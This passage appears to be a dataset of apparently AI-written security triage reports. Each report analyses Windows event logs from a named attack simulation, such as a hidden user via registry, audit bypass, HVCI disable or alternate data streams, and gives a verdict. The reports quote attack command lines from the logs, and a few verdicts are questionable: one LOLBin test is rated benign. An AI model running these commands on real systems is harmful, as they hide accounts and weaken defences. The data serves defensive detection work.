  3. **Credentials and Access Review:** Promptly review and potentially reset credentials for the `SERVER002\\admin_test` user and any other accounts with elevated privileges.
  4. **Update and Patch:** Ensure that all systems are running the latest patches and updates to mitigate any known vulnerabilities.
  5. **Educate and Train Users:** Reinforce user education and security training to detect and respond to suspicious activities.

The patterns and behaviors exhibited in the logs strongly indicate a compromised system situation that warrants a proactive security response."
Office 365 - Set Audit Bypass For a Mailbox,"### Detailed Analysis of the Logs

#### Application Log
- **Log Entry**: Software Protection Platform Service event with EventID 16384
  - **Observation**: This event is benign and related to the periodic maintenance tasks of the Windows licensing infrastructure. No suspicious activity noted.

#### Sysmon Log
- **PowerShell Execution**
  - **Details**: Multiple instances of `powershell.exe` were observed with high-integrity levels indicating elevated privileges.
  - **Noteworthy Execution**: 
    - **Command**: `powershell.exe &{$secure_pwd = \""o365_password_test\"" | ConvertTo-SecureString -AsPlainText -Force, $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \""o365_user_test\"", $secure_pwd, Connect-ExchangeOnline -Credential $creds, Set-MailboxAuditBypassAssociation -Identity \""o365_email_test\"" -AuditBypassEnabled $true}`
    - **Concern**: This command involves manipulating Office 365 credentials and setting an audit bypass, which poses a significant security risk as it indicates an intent to avoid detection and access powerful admin functionalities.
    - **User**: `SERVER002\\admin_test` running the script raises suspicion if this account doesn't typically perform such tasks.

- **Frequent Execution of Windows Utilities**
  - **Details**: `whoami.exe`, `hostname.exe`, and `wevtutil.exe` executed multiple times within seconds.
  - **Observation**: Tools like `whoami.exe` and `hostname.exe` can be used in scripts to ascertain user and host context, which might be benign in regular administrative tasks. However, combined with the suspicious PowerShell command, these could be part of a reconnaissance phase.

- **`wevtutil.exe` Execution**
  - **Observation**: Utilized to manage event logs, this can be employed to clear logs as part of hiding malicious activity.

#### System Log
- **Windows Update Logs**
  - **Observation**: Frequent Windows updates are logged. No anomalous activity or failed updates are noted in this context.

#### Windows PowerShell Log
- **Repeated PowerShell Commands**:
  - **Command**: Matches the suspicious PowerShell command found in the Sysmon logs involving Office 365 credential manipulation.
  - **Observation**: The event logs with the same command executed multiple times may signify attempts to establish persistence or effect changes to configurations.

### Assessment
- Multiple executions of a PowerShell script intended to manipulate Office 365 credentials and bypass auditing features stand out as strongly indicative of potentially malicious intent.
- Processes like `wevtutil.exe` and context information retrieval commands executed closely within this timeframe further suggest reconnaissance or persistence efforts by an unauthorized user.
- The identified actions, specifically attempting to disable audit trails, raise severe security concerns.

### Resolution
Based on the logs analyzed, **MALICIOUS** activity is identified due to:
- The PowerShell script attempting unauthorized Office 365 interactions and audit manipulation.
- The execution of system utilities in a sequence that aligns with common tactics to masquerade or hide administrative actions.

### Guidance/Recommendations
1. **Immediate Response**:
   - Disable or suspend the `admin_test` account pending further investigation.
   - Review Office 365 logs for any unauthorized access or changes, particularly focusing on mailboxes or user accounts linked to `o365_user_test`.
   - Isolate `Server002` to prevent further network interactions until the scope of the breach is determined.

2. **Investigation**:
   - Conduct a thorough forensic analysis on `Server002` focusing on PowerShell history, command execution, and recent logins.
   - Verify any anomalies in the use of credentials on the Office 365 platform.

3. **Long-term Actions**:
   - Implement additional monitoring on high-privilege accounts and critical servers.
   - Educate users on recognizing phishing attempts that may lead to credential compromise.
   - Review and tighten PowerShell execution policies and enhance logging/alerting mechanisms."
Enabling Remote Desktop Protocol via Remote Registry,"Upon analyzing the provided logs for indicators of compromise, the following observations and analyses were made:

### Suspicious or Anomalous Behavior:
1. **Frequent Execution of `wevtutil.exe` and `conhost.exe`:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test` are observed. `wevtutil.exe` is commonly used for modifying or reading event logs, which might be benign but can also indicate an attempt to hide malicious activities by clearing logs. The presence of these tools and frequent execution patterns are unusual and might require further verification to ensure they align with expected administrative tasks.

2. **Execution of `cmd.exe` with Registry Manipulation:**
   - There is an execution of `cmd.exe` with a command to alter the `SecurityLayer` registry setting under the path `hklm\SYSTEM\CurrentControlSet\Control\Terminal Server\Winstations\RDP-Tcp`. Changing this registry key can weaken the security for Remote Desktop Services (RDS) by lowering the encryption level, which is a common tactic used by attackers to facilitate RDP-based attacks.

3. **Commands and Integrity Levels:**
   - All events point to high integrity levels for processes being executed under the user `SERVER002\admin_test`, indicating that the user account has high privileges. The use of administrative accounts to execute such commands amplifies potential risk.

4. **Network and System Process Activities:**
   - Processes such as `sppsvc.exe` (Software Protection Platform Service), `TrustedInstaller.exe`, and `WmiPrvSE.exe` are typical system processes seen running under system or network service accounts and do not exhibit immediate signs of compromise.
   
5. **MicrosoftEdgeUpdate.exe Service:**
   - `MicrosoftEdgeUpdate.exe` execution could be part of routine updates if executed under `NT AUTHORITY\SYSTEM` with legitimate paths and hashes. However, this should not be an immediate concern unless seen with other malicious indicators.

### Malicious Activity or Compromise Indicators:
The combination of multiple suspicious process executions and registry modifications suggests potential malicious intentions behind these activities. While individually, some of these could be justified under certain administrative tasks, their presence together, especially involving security-sensitive configurations, indicates potential compromise.

### Assessment and Guidance:
- **Assessment:** The logs indicate SUSPICIOUS activity. Specifically, changes to security settings and clearing of logs without clear justification are red flags that suggest either unauthorized gold activity or unauthorized actions by the `admin_test` account.
  
- **Guidance:** 
  - **Isolate:** Consider isolating the host for further investigation to prevent potential spread or escalation of attacks.
  - **Verify Activities:** Confirm if the user (`admin_test`) performing these actions had legitimate reasons. Check job roles and scripts or automation processes that might justify these actions.
  - **Further Investigation:** Conduct deeper analysis into recent changes to event logs or system configurations. Search for other signs such as lateral movement or data exfiltration.
  - **Audit and Remediate:** Audit other systems for similar behavior and ensure systems are consistently monitored for unexpected changes. Implement enhanced logging for critical actions and review user privileges.
  
Finally, conduct a thorough examination of any lateral movement attempts or data access to ensure no data breach or further system intrusion is involved."
Create Windows System File with Attrib,"Upon reviewing the provided Windows event logs, the following observations and assessments have been made:

1. **Security Logs**:
   - The logs predominantly show time change events (`EventID: 4616`) by the `svchost.exe` process running under the `LOCAL SERVICE` user. Changing system time can be used to bypass or manipulate timestamp-based security checks. This alone isn't enough to declare a malicious activity, but it is worth noting.

2. **Application Logs**:
   - Logs indicate that the `edgeupdate` service was stopped twice, which is typical behavior during an update and doesn't raise inherent suspicions.

3. **Sysmon Logs**:
   - Multiple command invocations via `cmd.exe` and its child processes (`conhost.exe`) are observed. They all executed under the `SERVER002\admin_test` account, with high integrity level, indicating administrative privileges.
   - Commands like `IF EXIST %%temp%%\data.001.txt`, `echo system_Attrib_data.001`, and `attrib.exe +s` suggest file manipulation activities. While such operations could be legitimate when maintaining system states or configurations, they also mimic data staging techniques used in attacks.
   - The frequent usage of `wevtutil.exe`, which is a legitimate utility for managing Windows event logs, can be suspicious if not expected in an automated script or maintenance task, as it can also be used to evade detections by clearing logs.
   - Execution of `whoami.exe` might indicate a check on user identity, often seen in reconnaissance phases of attacks.
   - The use of `MicrosoftEdgeUpdate.exe` seems aligned with normal update activities for Microsoft Edge.
   - The appearance and rapid succession of subprocesses might suggest automated script execution.
   
4. **Other Logs**:
   - No indications in the PowerShell or System logs that accompany the behavior observed in Sysmon logs, making the Sysmon logs stand more out of alignment with standard system operations.

### Assessment:
The behavior observed in these logs, especially around `cmd.exe` executions and log management tasks suspiciously executed by a high-privilege user (`admin_test`), raises concerns of anomalous or potentially unauthorized activity. The combination of potential file modification, log management with `wevtutil.exe`, and identity confirmations through `whoami.exe` suggests actions aligning with a sophisticated attempt either to automate system maintenance tasks or potentially preparation for more nefarious undertakings.

### Resolution: **SUSPICIOUS**

**Guidance**:
- **Further Investigation**: Perform a thorough investigation into recent administrative scripts and scheduled tasks on the CEO's machine. Confirm the expected behaviors related to log and file handling.
- **User Activity**: Verify legitimate use of the `admin_test` account during this time, specifically cross-checking for other logged interactive sessions.
- **File Analysis**: Investigate the contents and origin of `data.001.txt` for any sensitive or unexpected data.
- **Monitoring**: Set up extensive monitoring on `SERVER002`, focusing on privileged user actions and potential indicators of data exfiltration.
- **Alert Review**: Examine any related alerts that might give context to this activity to discern whether it's part of a broader incident."
Invoke CHM with InfoTech Storage Protocol Handler,"**Detailed Analysis of Logs:**

1. **PowerShell Log Analysis:**
   - In all PowerShell log entries, the command line shows `powershell.exe & {Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\\hh.exe -CHMFilePath Test.chm}` being executed. The use of `Invoke-ATHCompiledHelp` and its arguments is not typical and could indicate a script intended to execute compiled help files in a suspicious manner. Usage of external scripts such as `Invoke-ATHCompiledHelp` can be indicative of script-based attack vectors if they are not recognized as part of authorized tasks.
   
2. **Sysmon Log Analysis:**
   - The Sysmon entries reveal several processes initiated by `SERVER002\admin_test`. There are frequent executions of PowerShell, conhost.exe, wevtutil.exe, and others in a short timeframe.
   - Wevtutil.exe is used which is primarily for managing event logs, suspicious when coupled with rapid execution. It could suggest attempts to manipulate or clear event logs.
   - High integrity level and the use of `powershell.exe` with an unrecognized command further reinforce potential malicious behavior.

3. **Security Log Analysis:**
   - Event ID 4624 indicates a successful logon by the SYSTEM account. This is common but notable due to the elevated privileges typically associated with this account.
   - Event ID 4672 shows special privileges are assigned which includes privilege escalation capabilities such as `SeDebugPrivilege` and `SeLoadDriverPrivilege`.

4. **System Log Analysis:**
   - Reflects typical Windows update activity which appears benign. It doesn’t immediately show anomalies outside standard operations for updates.

**Assessment and Findings:**

- **Suspicious Activities:**
  - The use of PowerShell in the logs raises red flags primarily due to its use with a non-standard command. PowerShell is a powerful tool commonly leveraged in attacks.
  - The presence of `wevtutil.exe` repeatedly is concerning, possibly indicating attempts to suppress security event logs or change log configurations.

**Threats or Risks Identified:**

- **Potential Attempts at Evasion:**
  - PowerShell scripts may execute routines that bypass defensive measures.
  - Event log manipulation indicates potential tampering to cover tracks post-compromise.

- **Privilege Escalation:**
  - With SYSTEM level access and multiple high-privilege actions being logged, escalation vectors are highly suspect.

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the machine if not yet done to prevent further potential damage or lateral movement.
   - Capture and preserve volatile data forensically for a more thorough investigation.
   - Review any scheduled tasks, startup entries, or persisted scripts or executables that could execute further compromise scripts.

2. **Detailed Investigation:**
   - Validate the purpose of `Invoke-ATHCompiledHelp` script to identify its source and intent.
   - Correlate similar patterns or suspicious events across other logs from related systems to determine scope.
   - Verify user `SERVER002\admin_test`: cross-reference against authorized admin users list and check for compromise.

3. **Resolution Decision:**
   - **Resolution: SUSPICIOUS** – There are clear signs of abnormal behavior that warrants further investigation to confirm whether malicious activity has been carried out or an administrative task was misconfigured."
office-365-Disable-AntiPhishRule,"Upon examining the provided logs, several observations indicate suspicious and potentially malicious activity on the CEO's machine:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Multiple entries in the PowerShell logs show command lines executed via `powershell.exe` that attempt to:
     - Connect to Exchange Online using credentials that appear to be empty/blank.
     - Disable Anti-Phishing rules using the command `Disable-AntiPhishRule -Identity $test.Name -Confirm:$false`.
   - This activity is particularly concerning because disabling security features like Anti-Phishing rules can remove critical protections, facilitating further malicious actions.

2. **Process Execution:**
   - The Sysmon logs reveal that PowerShell (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) was executed multiple times by the user `SERVER002\\admin_test`, including with the command line configurations that match those seen in the PowerShell logs.
   - The command includes the `-ExecutionPolicy Restricted` flag, which is unusual because typically, attackers would use a less restrictive execution policy to allow script execution. However, the use of aggressive operations (like disabling Anti-Phishing rules) without visible script constraints might denote an attempt to bypass conventional restrictions.

3. **Unusual Use of `wevtutil.exe`:**
   - There are several executions of `wevtutil.exe`, a Windows command-line utility that can be used to manage event logs. Frequent use of event utility tools can indicate log-clearing activities, which are often used to hide malicious actions.

4. **Suspicious Parent Processes:**
   - Under multiple instances, `wsmprovhost.exe` appears as a parent process. While `wsmprovhost.exe` is a legitimate process, its invocation as a parent of PowerShell, especially during suspicious activities, could suggest lateral movement or remote script execution via Windows Remote Management.

5. **Updates and UEFI Related Processes:**
   - Although a series of Windows updates and executions of `SecureBootEncodeUEFI.exe` were logged, these may not directly be linked to malicious intent but should be noted given the context of potential compromise. 

### Potential Malicious Indicators:

- The attempt to manipulate security rules is a strong indicator of malicious intent.
- Consistent creation and manipulation of command-line processes, particularly with PowerShell, exemplify significant risks of unauthorized access and execution.
- The presence of potentially abnormal entries in processes involving system components and security service processes (such as `CompatTelRunner.exe` and `whoami.exe`) activated alongside such PowerShell activities can suggest attempts to probe or bypass system security settings.

### Assessment of the Situation:

The logs demonstrate activities that are not typical for standard operations, particularly those revolving around manipulating security configurations and potentially covering tracks using event log utilities. The combined effect of these actions suggests a concerted effort to compromise the system's security posture.

### Conclusion:

**Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the concerned host (CEO's machine) from the network to prevent further spread or exfiltration.
   - Gather any additional logs and artifacts that could aid in detailed forensic analysis.

2. **Investigation:**
   - Conduct thorough disk and memory forensics to uncover the full extent of the compromise, identifying any potentially planted backdoors or malware.
   - Review network traffic to identify potential communication with external threat actors.

3. **Remediation:**
   - Reset credentials, especially for potentially compromised accounts like `admin_test`.
   - Reinforce security configurations, ensuring such critical rules as Anti-Phishing remain enabled.
   - Conduct a broader security review to identify and address any broader infrastructure vulnerabilities.

4. **Communication:**
   - Inform relevant internal stakeholders and if necessary, report to external regulatory bodies as dictated by the nature of the breach."
Disable Hypervisor-Enforced Code Integrity (HVCI),"### Analysis of Logs:

**Observation:**

1. **Repeated Registry Queries:** 
   - The logs show multiple `cmd.exe` and `reg.exe` executions querying the registry for configuration settings related to ""DeviceGuard,"" specifically `EnableVirtualizationBasedSecurity`, `RequirePlatformSecurityFeatures`, `Locked`, and `HypervisorEnforcedCodeIntegrity`.
   - Such queries could be legitimate administrative checks or part of a security verification script.

2. **PowerShell Script Execution:**
   - A PowerShell command is issued to disable `HypervisorEnforcedCodeIntegrity` by setting its registry value to `0`.
   - Disabling or modifying security features using PowerShell can be a hallmark of potential malicious activity, particularly if executed without proper authorization.

3. **High Integrity Levels:**
   - Many processes exhibit a ""High"" integrity level, meaning that the actions are executed with elevated privileges. This is important to note as malicious actors often aim to execute commands with elevated privileges.

4. **MicrosoftEdgeUpdate.exe Execution:**
   - The execution of `MicrosoftEdgeUpdate.exe` is related to routine software updates. It runs under a system account and indicates the potential for legitimate system maintenance.

5. **Execution of `whoami` and `hostname`:**
   - `whoami.exe` and `hostname.exe` commands are run. These commands are generally harmless and are often used to query the current user or system information, possibly being part of a script.

6. **Use of `wevtutil.exe`:**
   - The presence of `wevtutil.exe` suggests interaction with Windows event logs, which could mean log clearing or modification, often associated with an attempt to cover tracks maliciously.

**Suspicious Events:**

- The series of commands (`cmd.exe`, `reg.exe`, `findstr.exe`, `PowerShell`) querying and modifying registry keys related to critical security settings (specifically `DeviceGuard`) suggests an attempt to possibly weaken system security.
- Execution of a PowerShell script that alters registry settings related to security is particularly concerning, as it might be an attempted, unauthorized security feature bypass.

### Assessment:

- **Threat/Risks Identified:** There is a significant threat that system security was potentially compromised by altering critical security configurations via unauthorized registry manipulation.
  
### Guidance:

1. **Immediate Actions:**
   - Validate administrative intents: Verify with authorized personnel or IT whether the PowerShell script and registry changes were part of legitimate administrative tasks.
   - Review system configuration: Check current configuration of `DeviceGuard` and `HypervisorEnforcedCodeIntegrity` settings to ensure they conform to the organization's security policy.
   - Conduct deeper forensic analysis: Examine other logs (e.g., authentication, application) and systems for further signs of compromise.

2. **Long-term Recommendations:**
   - Implement monitoring and alerting: Enhance monitoring for critical registry changes and unauthorized PowerShell script executions.
   - Educate and train staff about safe PowerShell script usage and best security practices.
   - Secure privileged accounts and enforce the least privilege principle.

### Resolution:

- **SUSPICIOUS:** The activity in the logs appears suspicious and warrants further investigation to determine whether malicious activity is present or an externally motivated security assessment was conducted without documented approval."
Create Hidden User in Registry,"Based on the analysis of the provided Windows event logs, there are several indicators of potential malicious activity. Let's break down the suspicious findings:

1. **Unusual Process and Command Execution**:
   - Sysmon event listings show the use of several system tools (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, `reg.exe`). While these tools are native to Windows, their concurrent execution by the same user (`SERVER002\\admin_test`) in such a rapid sequence is highly unusual and indicative of a script or automated task execution.
   - The particularly suspicious command execution can be seen in the use of `cmd.exe` to add a new user with the command:
     ```
     ""cmd.exe"" /c NET USER fileOperator$ At0micRedTeam! /ADD /expires:never & REG ADD ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"" /v fileOperator$ /t REG_DWORD /d 0
     ```
     This command adds a hidden user account, `fileOperator$`, with a specified password, which is a known stealth technique used by attackers to maintain access to a system.

2. **Security Logs Reflecting User Account Violations**:
   - Several Security log events, such as Event ID 4720, 4722, 4738, and 4724, indicate the creation, activation, and modification of user accounts. The logs clearly show the creation of the `fileOperator$` user and changes to its domain membership.
   - Event ID 4728 and 4732 also indicate group membership changes, which can be used to escalate privileges or maintain persistence in the domain.

3. **Privilege Escalation and Account Persistence**:
   - Using `REG ADD` to modify registry entries to hide accounts further indicates the intent to maintain unauthorized persistence on the system.

Given the pattern observed - rapid succession of native tool execution, user account manipulation, and registry changes to hide a created account - these activities are consistent with known malicious techniques used by attackers once they gain access to a system.

**Assessment & Recommendation:**
- **Malicious Activity Detected**: The logs contain evidence of unauthorized user creation and registry manipulation to hide this activity, which are strong indicators of malicious intent.
  
- **Recommendations**: 
  - Immediately disable the `fileOperator$` account and any other suspicious accounts created during this time frame.
  - Conduct a thorough investigation to ascertain how access was initially gained.
  - Review security policies and the integrity of the CEO's and associated systems.
  - Implement monitoring for similar behaviors in the future to quickly detect such activities.
  - Consider a full incident response procedure to ensure any remaining threats are mitigated.

Resolution: **MALICIOUS**"
Disable Windows Registry Tool,"### Detailed Analysis of Logs:

#### Security Logs
- Events ID 4616 indicate that the system time was changed. The process involved is `svchost.exe`, typically a legitimate Windows process. However, frequent time changes can sometimes be a technique to avoid detection by altering time-based logs and timestamps.

#### Application Logs
- The entry from the `edgeupdate` service simply indicates that the service stopped. This is common behavior and doesn't indicate immediate malicious activity unless correlated with other suspicious activities.

#### Windows PowerShell Logs
- There are no entries in the Windows PowerShell logs, which means there is no evidence of suspicious PowerShell activity within this timeframe.

#### System Logs
- Related security logs show system time changes, likely initiated by the time service or potentially aberrant if unauthorized changes are suspected. No immediate concern without further context or repeated behavior.

#### Sysmon Logs
- Frequent launching of `wevtutil.exe` associated with a user account `SERVER002\admin_test`. `wevtutil.exe` is a legitimate tool for exporting, archiving, and clearing event logs, but its use can indicate log tampering if not done legitimately by an IT admin or process tied to regular system maintenance.
  
- Launches of `cmd.exe` with the command line `reg add HKEY_CURRENT_USER\\...\\DisableRegistryTools` indicate attempts to modify the registry to disable registry tools. This is suspicious and potentially hostile, as it can be an attempt to obscure further modifications or prevent detection efforts.
  
- Several process executions, including `hostname.exe`, `whoami.exe`, followed by registry modification are atypical operations that can indicate a process trying to gather system information.
  
- Edge Update-related processes seem to be legitimate based on their paths and execution context, likely part of a scheduled update process.

### Assessment:
The sequence of events surrounding the execution of `cmd.exe` to disable registry tools and repeated use of `wevtutil.exe` for potential log manipulation is highly suspicious. This behavior, combined with the use of system enumeration commands like `whoami.exe` and `hostname.exe`, aligns with tactics used in early-stage intrusion activities or persistence mechanisms established by adversaries. Additionally, the context and timing of these events relative to legitimate system operations are unusual and warrant further investigation.

### Guidance and Resolution:
- **Resolution: SUSPICIOUS**: The activities observed are suspicious and warrant further investigation to confirm malicious intent or ascertain if they are part of sanctioned administrative actions. 

#### Suggested Actions:
1. **Verify User Actions**: Determine if `SERVER002\admin_test` is a legitimate user account of an IT admin or an unauthorized account.
2. **Behavioral Analysis**: Investigate any recent user behavior reports or alerts that coincide with these log entries.
3. **User Access Audit**: Conduct a detailed audit of all accesses and modifications made under the `SERVER002\admin_test` account.
4. **Review Policies**: Ensure your organization's policy on log management and registry edits was not violated, and check for any deviations from expected procedures.
5. **Containment**: If unauthorized activities are confirmed, isolate the device and account while conserving evidence for forensic investigation.
6. **Follow-up Measures**: Monitor for further log alterations or suspicious actions and strengthen monitoring and response protocols around registry and event log handling."
System File Copied to Unusual Location,"Upon reviewing the provided Windows event logs, several activities stand out as potentially suspicious and warrant further investigation:

1. **PowerShell Activity**:
   - There is a PowerShell command executed that involves copying `cmd.exe` to a new location and starting it up. This is seen in multiple logs with the command: 
     ```
     powershell.exe & {copy-item \""$env:windir\\System32\\cmd.exe\"" -destination \""$env:allusersprofile\\cmd.exe\"" start-process \""$env:allusersprofile\\cmd.exe\"" sleep -s 5 stop-process -name \""cmd\"" | out-null}
     ```
   - Such activity can be indicative of an attempt to spawn a new instance of the command prompt or to create a backup of `cmd.exe` for potentially unauthorized uses, which is considered suspicious behavior.

2. **Sysmon Events**:
   - Associated Sysmon events show `cmd.exe` being run from `C:\\ProgramData\\`, which is not a typical location for running system processes and could indicate an attempt to obfuscate the process:
     - `C:\\ProgramData\\cmd.exe`

3. **Credential Validation Failures**:
   - Multiple Security Audit events (EventID 5379) indicate failures to validate credentials. The ""ReturnCode"" `3221226021` suggests an issue in retrieving credentials which might align with brute-force attempts or automated tools failing to access certain resources with potentially malicious intent.

4. **Execution of System Utilities**:
   - There are several instances of `whoami.exe` and `hostname.exe` being executed. While these are legitimate Windows system utilities, frequent execution within a short time frame might be indicative of reconnaissance activities if not explained by legitimate user actions.

5. **Process Integrity Levels**:
   - Several processes are executed with the 'High' integrity level, showing they may have administrative privileges. This deserves close scrutiny when combined with the aforementioned suspicious activities.

Based on the above findings, these events contain some activities that are not typically benign and suggest potential malicious activities are taking place or being attempted. Therefore, the assessment of the situation at this point would be:

**Resolution: SUSPICIOUS**

### Recommendations:
- Conduct a thorough examination of any unexpected or unauthorized changes in the system and network settings.
- Validate whether the observed PowerShell and command-line actions are in line with any legitimate administrative tasks or a known workflow.
- Investigate the source and reasoning behind the repeated credential validation failures.
- Review user activity, especially related to the 'admin_test' account, to determine if these actions are legitimate or the account was compromised.
- Enhance monitoring to detect similar suspicious script execution or unusual process behaviors in the future.
- Consider conducting a malware scan or forensic analysis to identify and eliminate any potential threats."
attrib - hide file,"### Detailed Analysis:

Upon reviewing the provided Windows event logs, several entries exhibit behaviors that merit further discussion and categorization of potential activity patterns:

#### Application & Security Logs:
- **Application Log:** 
  - The ""Software Protection Platform Service"" (sppsvc) logs an event. There is nothing inherently malicious in the entry as `sppsvc` is a legitimate Windows service responsible for license validation.

- **Security Log:** 
  - The event `4616` pertains to system time changes handled by `svchost.exe`, running as `LOCAL SERVICE`. Time changes are normal for system clock synchronization but can be suspicious if not authorized, though there's no immediate indication of compromise here.

#### Sysmon Logs:
- **Process Execution:**
  - **whomai.exe Executions:** Frequently executed. Used to display user information. Its appearance is common, but if done repeatedly or in suspicious contexts, warrants concern. Observations here don't demonstrate obvious malicious intent or misuse.
  
  - **conhost.exe Instances:** As a console window host, it's often observed alongside commands like `whoami` and `cmd.exe`. Execution of `conhost.exe` alone isn't inherently suspicious but its association with multiple processes is worth noting.
  
  - **CMD and ATTRIB Commands:** Execution of `cmd.exe` with concatenated commands to create and hide directories/files:
    - `""cmd.exe"" /c mkdir %temp%\data.001_attrib_2 >nul 2>&1 & echo data.001_attrib1 >> %temp%\data.001_attrib_2\data.001_attrib1.txt & attrib.exe +h %temp%\data.001_attrib_2\data.001_attrib1.txt...`
    - These commands are often associated with script operations for legitimate tasks, though can suggest obfuscation activities when used in inappropriate contexts.

  - **EdgeUpdate Processes:**
    - Appear in both typical (`MicrosoftEdgeUpdate.exe`) paths and temporary (`Temp`) directories. While this may signal an update process, execution from temporary directories should be scrutinized to ensure no unauthorized files are executed under the guise of legitimate update tasks.

#### System Logs:
- **Kernel and Time Services:**
  - Events show time synchronization and time zone adjustments. Changes align with expected system behaviors and networking protocols.

### Assessment:
- **Suspicious Elements:**
  - The use of `cmd.exe` and `attrib.exe` in creating and hiding files in temporary directories, though may be part of an administrative script, warrants a further check on why these tasks are automated and whether they're legitimate.

- **Request for More Information:**
  - Evaluation of the context or scripts initiating these command line activities could clarify intentions. Additionally, checking for similar patterns on other logs or alerts can establish if a trend or campaign might be underway.

### Guidance on How to Proceed:
1. **Verify Task Schedules:** Investigate any scheduled tasks or services that might initiate these command processes.
2. **Conduct a Threat Hunt:** Search for associated hashes flagged in known malware databases.
3. **User Inquiry:** Confirm with responsible users or administrators if such scripting or tasks are expected.
4. **Enhanced Monitoring:** Consider enabling heightened monitoring or alert rules around specific command executions, directories, or file modifications identified.

### Resolution:
- **SUSPICIOUS.** Activity related to potentially unnecessary obfuscation should be reviewed further to understand its legitimacy and context, though no direct indicators of compromise are evident at this stage."
Store file in Alternate Data Stream (ADS),"Based on the provided event logs from the Windows host, the following analysis and observations can be made:

### Suspicious or Anomalous Behavior:

1. **Execution of `wevtutil.exe` and `conhost.exe`:**
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` were observed. While `wevtutil.exe` is a legitimate Windows utility to retrieve event logs, frequent execution patterns or irregular usage can signify that an adversary is trying to tamper with event logs. However, without the context of additional security logs, these occurrences alone are not overtly malicious.

2. **Command Execution through PowerShell:**
   - There was an instance of PowerShell being used with the command line argument indicative of an encoded command:
     - `powershell.exe & {if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) { New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki }, Start-Process -FilePath ""\""$env:comspec\"""" -ArgumentList ""\""/c,type,c:\windows\system32\cmd.exe,> ,`\""C:\Users\Public\Libraries\yanki\desktop.ini:desktop.ini`\""\""""`
   - This PowerShell activity raises a significant red flag as it involves creation of hidden alternate data streams (ADS) using the `type` and redirection commands in `cmd`, a technique often employed by attackers to hide malicious payloads or scripts from standard file system views. 

3. **Time Manipulation:**
   - The system log indicates two Security-Auditing events related to time change events potentially resetting the system time. Altering the system time can be an indicator of an attempt to bypass security mechanisms or create an alibi for actions performed in the past. It is crucial to understand the context, such as scheduled maintenance tasks or known software behavior that led to this change, to assess maliciousness. However, combined with the previously mentioned PowerShell activity, it leans towards suspicious behavior.

### Potential Malicious Activity:

- The PowerShell execution with encoded/complex command line arguments alongside the use of alternate data streams is highly suggestive of an attempt to obfuscate actions and evade detection. This, compounded with possible tampering of logs using `wevtutil.exe`, indicates the possibility of malicious intent.

- Time adjustments in the system logs might indicate an attempt to desynchronize logs or mask activity timestamps. 

### Assessment and Resolution:

Based on the analysis, the activities in the logs appear to indicate suspicious behavior that warrants further investigation, particularly focusing on the:
- Intent and source of the PowerShell command execution.
- Sequence and context behind the execution of `wevtutil.exe` and `conhost.exe`.
- Reasoning and source behind the time change events.

Overall resolution is: **SUSPICIOUS**

### Recommended Actions:

1. **Conduct a Deep Dive Analysis:**
   - Review the context of the PowerShell command execution, determine its origin (e.g., script, remote command), and assess its intended purpose.
   - Investigate the consistency and purpose of time change events with change management logs.
   - Analyze network logs, file integrity, and system changes around the times these logs were generated.

2. **Continuous Monitoring:**
   - Implement or enhance real-time monitoring for process executions like PowerShell activities that can indicate privilege misuse or malware behavior.

3. **Patch and Harden:**
   - Ensure systems are up-to-date with security patches.
   - Enforce least privilege access, especially on user accounts performing administrative actions.

4. **Conduct Threat Hunting:**
   - Consider deploying threat hunting teams to look for indicators of compromise (IoCs) that might not be captured by standard antivirus or EDR solutions.

By investigating these factors closely and continuing monitoring, it will help either rule out potential false positives or confirm the need for incident response actions."
Lolbin Gpscript logon option,"The provided logs contain a variety of entries from different sources, such as Security, Sysmon, System, and Application logs. Let's analyze the logs to identify any indicators of malicious activity or unusual behavior.

### Analysis:

#### Security Log:
1. **Event 4616:**
   - This event involves changes in system time by the `svchost.exe` process running under the `LOCAL SERVICE` account on `Server002`. The changes in time are very short in duration (milliseconds apart) and appear to be part of a routine time synchronization process. There's no indication of unauthorized time manipulation in these logs.

#### Sysmon Log:
1. **Process Creation (EventID 1):**
   - Repeatedly see processes like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `MicrosoftEdgeUpdate.exe`, and `MicrosoftEdgeUpdateSetup.exe` being executed.
   - The `cmd.exe` invocation with `/c Gpscript /logon` could be a scripted task or a benign script execution and requires further details outside this logfile for any associated risk.

2. **Microsoft Edge Update Activity:**
   - Multiple entries show the `MicrosoftEdgeUpdate.exe` process running, indicating an automatic update process for Microsoft Edge. This activity appears normal as there's no suspicious command-line or unknown executables associated with it.

#### System Log:
1. **Kernel-General Event:**
   - Time changes and cache updates related to timezone and system time adjustments are logged.
   - These events do not appear malicious; they are part of system operations concerning time synchronization, which aligns with the `security log` observations.

#### Application Log:
1. **Software Protection Platform Service Event:**
   - It reports a routine event with no unusual activity.
2. **EdgeUpdate Events:**
   - Logging regarding the starting and stopping of the EdgeUpdate service process, indicating standard background software update processes.

### Summary and Assessment:

- **Benign Processes and Services:** The processes and services observed, such as Microsoft Edge update processes and `svchost.exe`, are standard Windows operations, frequently observed on Windows systems.
- **Routine Time Change:** The time changes and timezone updates are typical of a correctly configured system.
- **No Command-Line Red Flags:** The command lines for executed processes do not show typical red flags like obfuscation or unusual parameters.

### Conclusion:

Based on the log analysis provided, no definitive or suspicious indicators of compromise or malicious activity were found. The activity seems to be system maintenance or updates, common on Windows environments.

**Resolution: BENIGN**

### Recommendations:
1. **Routine Monitoring:** Continue to monitor systems with EDR solutions to flag any new suspicious activities.
2. **Contextual Review:** If there are specific concerns about user behavior (e.g., the specific user invoking `cmd.exe`), consider an in-depth review of user actions through user activity logs or additional data related to enterprise operations.
3. **Platform Updates:** Ensure all system and application platforms, including security software, are up-to-date to limit the exposure to new vulnerabilities."
Unload Sysmon Filter Driver,"Upon reviewing the provided Windows event logs, the following analysis can be made:

